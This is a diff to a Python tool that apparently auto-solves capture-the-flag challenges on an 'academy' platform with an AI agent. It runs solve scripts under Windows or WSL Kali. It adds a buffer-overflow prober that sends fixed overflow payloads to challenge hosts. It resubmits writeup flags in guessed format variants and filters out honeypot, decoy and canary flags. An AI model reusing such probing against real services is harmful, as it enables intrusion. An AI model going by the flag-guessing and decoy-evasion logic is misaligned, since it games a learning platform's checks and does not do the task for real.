@@ -390,29 +390,44 @@ def is_decoy_flag(flag: str) -> bool:
     Detects if a candidate flag is a honeypot, decoy, fake flag, or test token.
     Normalizes separators (spaces, underscores, dashes, dots) for robust detection.
     Filters out description template placeholders such as academy{<character>}, academy{<decimal_value>}.
+    Allows valid hex flags (0x...) and alphanumeric flags without brackets.
     """
-    if not flag or "{" not in flag:
+    if not flag:
         return True
-    inner = flag.split("{", 1)[1].rstrip("}").strip().lower()
-    if len(inner) < 4:
-        return True
-
-    # Filter out template placeholders containing angle brackets or prompt placeholder names
-    if "<" in inner or ">" in inner:
-        return True
-    if any(p in inner for p in [
-        "<character>", "<decimal_value>", "decimal_value", "your_flag", "insert_flag",
-        "flag_here", "example_flag", "your-flag", "flag-here", "put_flag_here"
-    ]):
+    flag_clean = flag.strip()
+    if len(flag_clean) < 3:
         return True
 
-    inner_norm = re.sub(r'[^a-z0-9]', '', inner)
-
-    for kw in DECOY_FLAG_KEYWORDS:
-        kw_clean = kw.lstrip("{")
-        kw_norm = re.sub(r'[^a-z0-9]', '', kw_clean)
-        if kw in inner or (len(kw_norm) >= 4 and kw_norm in inner_norm):
+    # If it has standard CTF braces
+    if "{" in flag_clean and "}" in flag_clean:
+        inner = flag_clean.split("{", 1)[1].rsplit("}", 1)[0].strip().lower()
+        if len(inner) < 2:
             return True
+        # Filter out template placeholders from descriptions containing angle brackets or dummy strings
+        if "<" in inner or ">" in inner:
+            return True
+        if any(p in inner for p in [
+            "<character>", "<decimal_value>", "decimal_value", "your_flag", "insert_flag",
+            "flag_here", "example_flag", "your-flag", "flag-here", "put_flag_here"
+        ]):
+            return True
+
+        inner_norm = re.sub(r'[^a-z0-9]', '', inner)
+        for kw in DECOY_FLAG_KEYWORDS:
+            kw_clean = kw.lstrip("{")
+            kw_norm = re.sub(r'[^a-z0-9]', '', kw_clean)
+            if kw in inner or (len(kw_norm) >= 4 and kw_norm in inner_norm):
+                return True
+        return False
+
+    # Non-bracketed flags (e.g. 0x244 or alphanumeric tokens like encodedciyfcbkghm)
+    lower_flag = flag_clean.lower()
+    if lower_flag.startswith("0x") and len(lower_flag) >= 3 and re.fullmatch(r'0x[0-9a-fA-F]+', flag_clean):
+        return False
+    if any(kw in lower_flag for kw in ["decoy", "fake", "honey", "trap", "canary", "token"]):
+        return True
+    if len(flag_clean) >= 6 and re.fullmatch(r'[a-zA-Z0-9_\-]+', flag_clean):
+        return False
 
     return False
 
@@ -465,22 +480,84 @@ def sanitize_prompt_injection(text: str) -> str:
         sanitized = re.sub(rf'https?://[a-zA-Z0-9_\-\.]*{re.escape(domain)}[^\s<>\"\']*', '[FILTERED: CANARY TOKEN CALLBACK]', sanitized, flags=re.IGNORECASE)
     return sanitized
 
-def extract_flag(text: str) -> Optional[str]:
+def extract_flag(text: str, rejected_flags: Optional[Set[str]] = None) -> Optional[str]:
     """
     Extract a valid flag string, filtering out honeypots, decoys, prompt injection artifacts,
-    templates, control characters, and short garbage.
+    templates, control characters, short garbage, and any previously rejected flags.
+    Also supports hex flags (0x...) when bracketed flags are absent.
     """
     if not text:
         return None
+    rejected = rejected_flags or set()
     matches = FLAG_PATTERN.findall(text)
     for m in matches:
         m_clean = m.strip()
-        # Strictly require standard printable ASCII (no control chars, null bytes, etc.)
         if any(ord(c) < 32 or ord(c) > 126 for c in m_clean):
             continue
-        if is_decoy_flag(m_clean):
+        if is_decoy_flag(m_clean) or m_clean in rejected:
             continue
         return m_clean
+
+    # Fallback for hexadecimal flags (e.g. 0x244 in asm challenges)
+    hex_matches = re.findall(r'\b0x[0-9a-fA-F]{2,8}\b', text)
+    for h in hex_matches:
+        if h not in rejected and not is_decoy_flag(h):
+            return h
+
+    return None
+
+def try_submit_candidate_flag(client: Any, challenge_id: int, cand_flag: str, rejected_flags: Set[str], logger: Optional[Any] = None, notify: Optional[Callable] = None) -> Optional[str]:
+    """
+    Submits candidate flag with intelligent prefix and format permutations:
+    - As-is
+    - picoCTF{...} <-> academy{...}
+    - Comma tuple swap: academy{p,q} <-> academy{q,p}
+    - Raw string to academy{...}
+    Prevents duplicate submissions using rejected_flags.
+    """
+    if not cand_flag:
+        return None
+    cand_flag = cand_flag.strip()
+    if is_decoy_flag(cand_flag):
+        return None
+
+    variants = [cand_flag]
+    # 1. Prefix swap: picoCTF{} <-> academy{}
+    if cand_flag.startswith("picoCTF{") and cand_flag.endswith("}"):
+        inner = cand_flag[8:-1]
+        variants.append(f"academy{{{inner}}}")
+    elif cand_flag.startswith("academy{") and cand_flag.endswith("}"):
+        inner = cand_flag[8:-1]
+        variants.append(f"picoCTF{{{inner}}}")
+    elif "{" not in cand_flag and not cand_flag.startswith("0x"):
+        variants.append(f"academy{{{cand_flag}}}")
+
+    # 2. Comma swap for tuples: {p,q} <-> {q,p}
+    extra_variants = []
+    for v in list(variants):
+        if "{" in v and "}" in v:
+            pref, rest = v.split("{", 1)
+            inner = rest.rstrip("}")
+            if "," in inner and len(inner.split(",")) == 2:
+                parts = inner.split(",")
+                extra_variants.append(f"{pref}{{{parts[1].strip()},{parts[0].strip()}}}")
+    variants.extend(extra_variants)
+
+    for v in variants:
+        if v in rejected_flags:
+            continue
+        if notify:
+            notify(tr(f"  [cyan]Đang thử nộp cờ:[/cyan] [bold yellow]{v}[/bold yellow]...", f"  [cyan]Testing flag submission:[/cyan] [bold yellow]{v}[/bold yellow]..."))
+        res = client.submit_flag(challenge_id, v)
+        if res.get("correct") or "already solved" in str(res).lower():
+            if logger:
+                logger.log("FLAG_SUBMISSION_SUCCESS", f"Accepted flag variant: {v}", level="SUCCESS")
+            return v
+        else:
+            rejected_flags.add(v)
+            if logger:
+                logger.log("FLAG_SUBMISSION_REJECTED", f"Platform rejected flag variant: {v} ({res})", level="WARN")
+
     return None
 
 CENTRAL_LOG_FILE = WORKSPACE_DIR / "solver_activity.log"
@@ -2954,6 +3031,16 @@ def try_auto_solve(workspace_info):
         logger.log("HEURISTICS_ERROR", f"ZIP NTFS heuristic error: {e}", level="WARN")
         notify(f"[dim]ZIP NTFS heuristic error: {e}[/dim]")
 
+    # Pwn Heuristic: Simple Buffer Overflow prober
+    try:
+        bof_flag = solve_simple_bof_challenge(workspace_info)
+        if bof_flag:
+            logger.log("HEURISTICS_SUCCESS", f"Simple BOF prober solved flag: {bof_flag}", level="SUCCESS")
+            notify(f"[bold green][OK] Simple BOF prober solved flag: {bof_flag}[/bold green]")
+            return bof_flag
+    except Exception as e:
+        logger.log("HEURISTICS_ERROR", f"Simple BOF heuristic error: {e}", level="WARN")
+
     # Forensics Heuristic C: Audio SSTV & Containerized Steghide (m00nwalk2)
     try:
         hints_list = workspace_info.get("info", {}).get("hints", [])
@@ -3536,27 +3623,148 @@ def decompose_challenge_tasks(chal_name: str, chal_id: int, cat_name: str, sanit
         }
     ]
 
-def check_dir_for_flag(target_dir: Path, output: str = "") -> Optional[str]:
+
+def to_wsl_path(win_path: Union[str, Path]) -> str:
+    """Converts a Windows path to a WSL path (/mnt/c/...)."""
+    p = str(win_path).replace("\\", "/")
+    if len(p) >= 2 and p[1] == ":":
+        drive = p[0].lower()
+        return f"/mnt/{drive}{p[2:]}"
+    return p
+
+def execute_solve_script(solve_py: Path, target_dir: Path, timeout: int = 60, rejected: Optional[Set[str]] = None) -> Tuple[Optional[str], str]:
+    """
+    Executes solve.py with:
+    1. PYTHONPATH including the CTF root so lightweight pwn / pwn_compat is available natively on Windows.
+    2. Automatic WSL Kali fallback if execution fails or raises an error, ensuring ELF / pwntools compatibility.
+    """
+    rejected = rejected or set()
+    combined_out = ""
+    flag_found = None
+
+    # 1. Native Windows execution with injected PYTHONPATH
+    try:
+        env = os.environ.copy()
+        ctf_root = str(WORKSPACE_DIR.parent if WORKSPACE_DIR.name == "challenges" else WORKSPACE_DIR)
+        curr_pypath = env.get("PYTHONPATH", "")
+        env["PYTHONPATH"] = f"{ctf_root}{os.pathsep}{curr_pypath}" if curr_pypath else ctf_root
+
+        res = subprocess.run([sys.executable, "-u", str(solve_py)], cwd=str(target_dir), capture_output=True, text=True, timeout=timeout, env=env)
+        combined_out = (res.stdout or "") + "\n" + (res.stderr or "")
+        flag_found = extract_flag(res.stdout, rejected) or extract_flag(res.stderr, rejected)
+        if flag_found and flag_found not in rejected:
+            flag_file = target_dir / "flag.txt"
+            try: flag_file.write_text(flag_found, encoding="utf-8")
+            except Exception: pass
+            return flag_found, combined_out
+    except Exception as e:
+        combined_out += f"\nWindows execution note: {e}"
+
+    # 2. If flag not found and WSL is present, fallback to WSL Kali execution
+    if shutil.which("wsl") and (not flag_found or flag_found in rejected):
+        try:
+            wsl_target = to_wsl_path(target_dir)
+            wsl_solve = to_wsl_path(solve_py)
+            wsl_cmd = ["wsl", "-d", "kali-linux", "sh", "-c", f"cd '{wsl_target}' && python3 -u '{wsl_solve}'"]
+            res_wsl = subprocess.run(wsl_cmd, capture_output=True, text=True, timeout=timeout)
+            wsl_out = (res_wsl.stdout or "") + "\n" + (res_wsl.stderr or "")
+            combined_out += f"\n--- WSL Output ---\n{wsl_out}"
+            wsl_flag = extract_flag(res_wsl.stdout, rejected) or extract_flag(res_wsl.stderr, rejected)
+            if wsl_flag and wsl_flag not in rejected:
+                flag_file = target_dir / "flag.txt"
+                try: flag_file.write_text(wsl_flag, encoding="utf-8")
+                except Exception: pass
+                return wsl_flag, combined_out
+        except Exception as e:
+            combined_out += f"\nWSL execution note: {e}"
+
+    return flag_found, combined_out
+
+def solve_simple_bof_challenge(workspace_info: Dict[str, Any]) -> Optional[str]:
+    """
+    Fast prober for beginner Buffer Overflow challenges with on-demand service.
+    Tests cyclic offsets (16 to 80 bytes) and byte overwrites to recover flag.
+    """
+    category = workspace_info.get("category", "") or workspace_info.get("info", {}).get("category", "")
+    if "binary" not in category.lower() and "pwn" not in category.lower():
+        return None
+
+    host = workspace_info.get("target_host") or workspace_info.get("host")
+    port = workspace_info.get("target_port") or workspace_info.get("port")
+    if not host or not port:
+        return None
+
+    target_dir = workspace_info.get("dir")
+    try:
+        import socket
+        # Test candidate offsets and common winning byte/words
+        test_payloads = [
+            b"A" * 24 + b"A\n",
+            b"A" * 32 + b"\n",
+            b"A" * 40 + b"\n",
+            b"A" * 64 + b"\n",
+            b"A" * 72 + b"\n",
+            b"A" * 16 + b"A\n",
+            b"A" * 24 + b"\x41\x00\x00\x00\n",
+            b"A" * 32 + b"\x01\x00\x00\x00\n",
+            b"A" * 64 + b"\x01\x00\x00\x00\n"
+        ]
+        for payload in test_payloads:
+            try:
+                s = socket.create_connection((host, int(port)), timeout=3)
+                s.settimeout(3)
+                try:
+                    s.recv(1024)
+                except Exception:
+                    pass
+                s.sendall(payload)
+                resp = b""
+                for _ in range(5):
+                    try:
+                        chunk = s.recv(2048)
+                        if not chunk: break
+                        resp += chunk
+                        if b"academy{" in resp or b"}" in resp: break
+                    except Exception:
+                        break
+                s.close()
+                txt = resp.decode("latin-1", errors="ignore")
+                fl = extract_flag(txt)
+                if fl:
+                    if target_dir:
+                        (target_dir / "flag.txt").write_text(fl, encoding="utf-8")
+                    return fl
+            except Exception:
+                continue
+    except Exception:
+        pass
+    return None
+
+def check_dir_for_flag(target_dir: Path, output: str = "", rejected_flags: Optional[Set[str]] = None) -> Optional[str]:
     """
     Exhaustively scans for a candidate flag across:
     1. flag.txt
     2. Command output string
     3. Output of executing solve.py (stdout and stderr)
     4. Any recently modified text/markdown/log files in workspace (analysis.md, etc.)
-    Filters out honeypot, decoy, and canary files. Saves found flag to flag.txt.
+    Filters out honeypot, decoy, canary files, and any previously rejected flags.
     """
+    rejected = rejected_flags or set()
+
     flag_file = target_dir / "flag.txt"
     if flag_file.exists():
         try:
-            flag_found = extract_flag(flag_file.read_text(errors="ignore"))
-            if flag_found:
-                return flag_found
+            raw_c = flag_file.read_text(errors="ignore").strip()
+            if raw_c and raw_c not in rejected and not is_decoy_flag(raw_c):
+                extracted = extract_flag(raw_c, rejected) or raw_c
+                if extracted and extracted not in rejected and not is_decoy_flag(extracted):
+                    return extracted
         except Exception:
             pass
 
     if output:
-        flag_found = extract_flag(output)
-        if flag_found:
+        flag_found = extract_flag(output, rejected)
+        if flag_found and flag_found not in rejected:
             try:
                 flag_file.write_text(flag_found, encoding="utf-8")
             except Exception:
@@ -3566,13 +3774,8 @@ def check_dir_for_flag(target_dir: Path, output: str = "") -> Optional[str]:
     solve_py = target_dir / "solve.py"
     if solve_py.exists():
         try:
-            res = subprocess.run([sys.executable, "-u", str(solve_py)], cwd=str(target_dir), capture_output=True, text=True, timeout=60)
-            flag_found = extract_flag(res.stdout) or extract_flag(res.stderr)
-            if flag_found:
-                try:
-                    flag_file.write_text(flag_found, encoding="utf-8")
-                except Exception:
-                    pass
+            flag_found, _ = execute_solve_script(solve_py, target_dir, timeout=60, rejected=rejected)
+            if flag_found and flag_found not in rejected:
                 return flag_found
         except Exception:
             pass
@@ -3587,9 +3790,9 @@ def check_dir_for_flag(target_dir: Path, output: str = "") -> Optional[str]:
             if any(k in cand_name_lower for k in ["honey", "decoy", "trap", "fake_flag", "canary"]):
                 continue
             try:
-                content = cand.read_text(errors="ignore")
-                flag_found = extract_flag(content)
-                if flag_found:
+                cand_content = cand.read_text(errors="ignore")
+                flag_found = extract_flag(cand_content, rejected)
+                if flag_found and flag_found not in rejected:
                     try:
                         flag_file.write_text(flag_found, encoding="utf-8")
                     except Exception:
@@ -3915,8 +4118,14 @@ def solve_with_antigravity(workspace_info: dict, timeout: int = 240, status_call
         notify(tr(f"[red]Antigravity AI quá thời gian chờ ({timeout}s). Kiểm tra kết quả trong thư mục...[/red]", f"[red]Antigravity AI timed out ({timeout}s). Checking directory for partial results...[/red]"))
         logger.log("AI_TIMEOUT", f"Antigravity AI timed out after {timeout}s", level="WARN")
 
+        raw_out = ""
+        if hasattr(te, 'stdout') and te.stdout:
+            raw_out += te.stdout if isinstance(te.stdout, str) else te.stdout.decode("utf-8", errors="replace")
+        if hasattr(te, 'stderr') and te.stderr:
+            raw_out += "\n" + (te.stderr if isinstance(te.stderr, str) else te.stderr.decode("utf-8", errors="replace"))
+
         # Check directory for flag one last time
-        flag_salvaged = check_dir_for_flag(target_dir, "")
+        flag_salvaged = check_dir_for_flag(target_dir, raw_out)
         if flag_salvaged:
             return flag_salvaged
         if raw_out.strip():
@@ -3937,9 +4146,9 @@ def solve_with_antigravity(workspace_info: dict, timeout: int = 240, status_call
         if solve_py.exists():
             notify(tr("[bold cyan][*] Phát hiện `solve.py` đã được AI tạo trước khi timeout. Đang kích hoạt chạy trực tiếp...[/bold cyan]", "[bold cyan][*] Found `solve.py` created before timeout. Triggering direct execution...[/bold cyan]"))
             try:
-                res = subprocess.run([sys.executable, "-u", str(solve_py)], cwd=str(target_dir), capture_output=True, text=True, timeout=90)
-                out_solve = (res.stdout or "") + "\n" + (res.stderr or "")
-                flag_salvaged = check_dir_for_flag(target_dir, out_solve)
+                flag_salvaged, out_solve = execute_solve_script(solve_py, target_dir, timeout=90, rejected=rejected_flags)
+                if not flag_salvaged:
+                    flag_salvaged = check_dir_for_flag(target_dir, out_solve)
                 if flag_salvaged:
                     logger.log("AI_SOLVE_SUCCESS", f"solve.py direct execution recovered flag: {flag_salvaged}", level="SUCCESS")
                     notify(tr(f"[bold green][OK] Chạy trực tiếp `solve.py` thành công khôi phục flag: {flag_salvaged}[/bold green]", f"[bold green][OK] Direct execution of `solve.py` successfully recovered flag: {flag_salvaged}[/bold green]"))
@@ -4193,6 +4402,8 @@ def solve_challenge_flow(client: CyLabClient, manager: ChallengeManager, challen
     flag = None
     target_dir = workspace_info["dir"]
     is_on_demand = workspace_info.get("on_demand", False)
+    rejected_flags: Set[str] = set()
+    workspace_info["rejected_flags"] = rejected_flags
 
     # Helper function to ensure live instance is deployed and running
     def ensure_live_instance() -> Tuple[str, int, str]:
@@ -4273,6 +4484,53 @@ def solve_challenge_flow(client: CyLabClient, manager: ChallengeManager, challen
                     cfg_file.write_text(f"HOST={thost}\nPORT={tport}\nURL={turl}\n", encoding="utf-8")
                 except Exception:
                     pass
+
+                # Auto-download any newly revealed files post-deployment
+                new_download_urls = []
+                for href in re.findall(r"""href=['"]([^'"]+)['"]""", desc_t):
+                    new_download_urls.append(href)
+                for src in re.findall(r"""src=['"]([^'"]+)['"]""", desc_t):
+                    new_download_urls.append(src)
+                for md_link in re.findall(r"\[.*?\]\((https?://[^\s\)]+|/[^\s\)]+)\)", desc_t):
+                    new_download_urls.append(md_link)
+                for f_item in (inst_check.get("files") or []):
+                    if isinstance(f_item, str):
+                        new_download_urls.append(f_item)
+                    elif isinstance(f_item, dict):
+                        if f_item.get("url"):
+                            new_download_urls.append(f_item["url"])
+                        elif f_item.get("path"):
+                            new_download_urls.append(f_item["path"])
+
+                if new_download_urls:
+                    from urllib.parse import unquote
+                    for link in set(new_download_urls):
+                        is_chal_file = (
+                            "challenge-files" in link
+                            or "/library/" in link
+                            or "/files/" in link
+                            or any(link.lower().split("?")[0].endswith(ext) for ext in [
+                                '.c', '.cpp', '.py', '.txt', '.zip', '.tar.gz', '.tgz', '.tar', '.gz',
+                                '.bz2', '.elf', '.bin', '.exe', '.chall', '.enc_flag', '.pcap', '.pcapng',
+                                '.apk', '.jpg', '.png', '.docm', '.docx', '.pdf', '.iso', '.img', '.wav',
+                                '.mp3', '.db', '.sqlite', '.json', '.asm', '.hex', '.dat', '.out', '.jar',
+                                '.class', '.so', '.dll', '.sage'
+                            ])
+                        )
+                        if is_chal_file:
+                            file_url = link if link.startswith("http") else f"{client.base_url}{link}"
+                            raw_fname = unquote(file_url.split("?")[0].split("#")[0].split("/")[-1].strip())
+                            dl_fname = sanitize_filename(raw_fname)
+                            if dl_fname and not (target_dir / dl_fname).exists():
+                                try:
+                                    notify(tr(f"[cyan]Tự động tải thêm file mới sau khi deploy:[/cyan] {dl_fname}...", f"[cyan]Auto-downloading post-deploy attachment:[/cyan] {dl_fname}..."))
+                                    r_dl = client.session.get(file_url, impersonate="chrome", timeout=120)
+                                    if r_dl.status_code == 200:
+                                        (target_dir / dl_fname).write_bytes(r_dl.content)
+                                        if dl_fname.endswith((".zip", ".tar.gz", ".tgz", ".tar", ".gz", ".bz2")):
+                                            extract_archive(target_dir / dl_fname, target_dir)
+                                except Exception:
+                                    pass
         return thost, tport, turl
 
     # Check for local writeup / solve.py
@@ -4339,27 +4597,21 @@ def solve_challenge_flow(client: CyLabClient, manager: ChallengeManager, challen
             if m_p:
                 cand_flag = m_p.group(0).strip()
 
-        if cand_flag and is_decoy_flag(cand_flag):
-            cand_flag = None
-
         if cand_flag:
-            notify(tr(f"  [cyan]Thử nộp cờ có sẵn từ writeup:[/cyan] [bold yellow]{cand_flag}[/bold yellow]...", f"  [cyan]Trying flag from writeup:[/cyan] [bold yellow]{cand_flag}[/bold yellow]..."))
-            res = client.submit_flag(challenge_id, cand_flag)
-            if res.get("correct") or "already solved" in str(res).lower():
-                flag = cand_flag
+            accepted = try_submit_candidate_flag(client, challenge_id, cand_flag, rejected_flags, logger=logger, notify=notify)
+            if accepted:
+                flag = accepted
                 logger.log("STAGE_WRITEUP_SUCCESS", f"Solved via writeup static flag: {flag}", level="SUCCESS")
                 notify(tr(f"[bold green][OK] Nộp thành công cờ từ writeup: {flag}![/bold green]", f"[bold green][OK] Successfully submitted writeup flag: {flag}![/bold green]"))
                 record_solve_and_writeup(workspace_info, flag, writeup_details="Solved via existing writeup flag.")
                 manager.mark_solved(challenge_id)
                 if is_on_demand:
-                    try:
-                        client.stop_instance(challenge_id)
-                    except Exception:
-                        pass
+                    try: client.stop_instance(challenge_id)
+                    except Exception: pass
                 return flag
             else:
-                notify(tr(f"  [yellow]Cờ trong writeup không được chấp nhận ({res}). Tiến hành đọc hiểu toàn bộ writeup để giải...[/yellow]", f"  [yellow]Writeup flag rejected ({res}). Reading writeup instructions to re-solve...[/yellow]"))
-                logger.log("STAGE_WRITEUP_FLAG_FAIL", f"Writeup flag failed: {res}. Proceeding to follow writeup instructions.")
+                notify(tr("  [yellow]Cờ trong writeup không được chấp nhận. Tiến hành đọc hiểu toàn bộ writeup để giải...[/yellow]", "  [yellow]Writeup flag rejected. Reading writeup instructions to re-solve...[/yellow]"))
+                logger.log("STAGE_WRITEUP_FLAG_FAIL", f"Writeup flag '{cand_flag}' failed. Proceeding to follow writeup instructions.")
 
         # 1.2 "Nếu flag trong writeup fail thì đọc toàn bộ writeup, hiểu cách giải rồi giải theo hướng dẫn của writeup"
         thost, tport, turl = ensure_live_instance()
@@ -4382,9 +4634,9 @@ def solve_challenge_flow(client: CyLabClient, manager: ChallengeManager, challen
                 if m_dyn:
                     dyn_flag = m_dyn.group(0).strip()
                     notify(tr(f"  [bold green][OK] solve.py trích xuất thành công cờ mới:[/bold green] [bold yellow]{dyn_flag}[/bold yellow]. Đang nộp...", f"  [bold green][OK] solve.py extracted new flag:[/bold green] [bold yellow]{dyn_flag}[/bold yellow]. Submitting..."))
-                    res = client.submit_flag(challenge_id, dyn_flag)
-                    if res.get("correct") or "already solved" in str(res).lower():
-                        flag = dyn_flag
+                    accepted = try_submit_candidate_flag(client, challenge_id, dyn_flag, rejected_flags, logger=logger, notify=notify)
+                    if accepted:
+                        flag = accepted
                         logger.log("STAGE_WRITEUP_SOLVE_PY_SUCCESS", f"Solved via writeup solve.py: {flag}", level="SUCCESS")
                         notify(tr(f"[bold green][OK] Nộp thành công cờ dynamic: {flag}![/bold green]", f"[bold green][OK] Successfully submitted dynamic flag: {flag}![/bold green]"))
                         record_solve_and_writeup(workspace_info, flag, writeup_details="Solved via writeup solve.py.")
@@ -4404,10 +4656,9 @@ def solve_challenge_flow(client: CyLabClient, manager: ChallengeManager, challen
             logger.log("STAGE_WRITEUP_AI_ERROR", f"Exception in solve_with_writeup_guidance: {e}", level="ERROR")
             ai_flag = None
         if ai_flag:
-            notify(tr(f"  [cyan]Đang nộp cờ tìm được từ hướng dẫn Writeup:[/cyan] [bold yellow]{ai_flag}[/bold yellow]...", f"  [cyan]Submitting flag from Writeup guidance:[/cyan] [bold yellow]{ai_flag}[/bold yellow]..."))
-            res = client.submit_flag(challenge_id, ai_flag)
-            if res.get("correct") or "already solved" in str(res).lower():
-                flag = ai_flag
+            accepted = try_submit_candidate_flag(client, challenge_id, ai_flag, rejected_flags, logger=logger, notify=notify)
+            if accepted:
+                flag = accepted
                 logger.log("STAGE_WRITEUP_AI_SUCCESS", f"Solved via AI following writeup instructions: {flag}", level="SUCCESS")
                 notify(tr(f"[bold green][OK] Nộp thành công cờ theo hướng dẫn Writeup: {flag}![/bold green]", f"[bold green][OK] Successfully submitted flag via Writeup instructions: {flag}![/bold green]"))
                 record_solve_and_writeup(workspace_info, flag, writeup_details="Solved via Antigravity following writeup instructions.")
